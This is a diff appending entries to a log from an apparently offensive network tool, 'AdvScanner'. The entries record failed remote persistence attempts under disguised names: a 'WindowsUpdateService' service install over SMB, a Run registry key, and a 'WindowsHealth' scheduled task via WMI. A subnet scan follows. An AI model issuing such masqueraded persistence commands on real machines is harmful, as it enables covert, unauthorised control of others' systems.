@@ -137,3 +137,18 @@
 2026-05-08 14:43:34,347 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
 2026-05-08 14:56:57,125 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
 2026-05-08 15:04:15,569 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
+2026-05-08 15:08:58,278 | [INFO] | AdvScanner | [SVC-INSTALL] None: WindowsUpdateService -> C:\Windows\System32\svchost.exe -k netsvcs
+2026-05-08 15:09:00,680 | [ERROR] | AdvScanner | [SVC-INSTALL] None: [Errno Connection error (None:445)] [Errno 11001] getaddrinfo failed
+2026-05-08 15:09:00,682 | [INFO] | AdvScanner | [REG-WRITE] None: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate = C:\Windows\System32\rundll32.exe
+2026-05-08 15:09:00,683 | [INFO] | AdvScanner | [WMI-EXEC] None: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" 
+2026-05-08 15:09:00,684 | [ERROR] | AdvScanner | [WMI-EXEC] None: object of type 'NoneType' has no len()
+2026-05-08 15:09:00,685 | [INFO] | AdvScanner | [REG-WRITE] None: FAILED
+2026-05-08 15:09:00,686 | [INFO] | AdvScanner | [WMI-EXEC] None: schtasks /create /tn "WindowsHealth" /tr "C:\Windows\System32\cmd.exe" /sc onlog
+2026-05-08 15:09:00,687 | [ERROR] | AdvScanner | [WMI-EXEC] None: object of type 'NoneType' has no len()
+2026-05-08 15:15:40,382 | [INFO] | AdvScanner | [DISCOVER] Starting comprehensive discovery on 192.168.137.0/24
+2026-05-08 15:15:43,248 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
+2026-05-08 15:15:43,250 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
+2026-05-08 15:16:47,321 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
+2026-05-08 15:22:03,526 | [INFO] | AdvScanner | [TCP-ULTRA] Found: 192.168.137.201 | OS: Windows | Ports: 2
+2026-05-08 15:24:02,719 | [INFO] | AdvScanner | [DISCOVER] Found 1 devices
+2026-05-08 15:24:02,721 | [INFO] | AdvScanner | [DISCOVER] Device: 192.168.137.201 | OS: Unknown Device Type | Type: unknown | Hostname: 192.168.137.201 | Ports: []
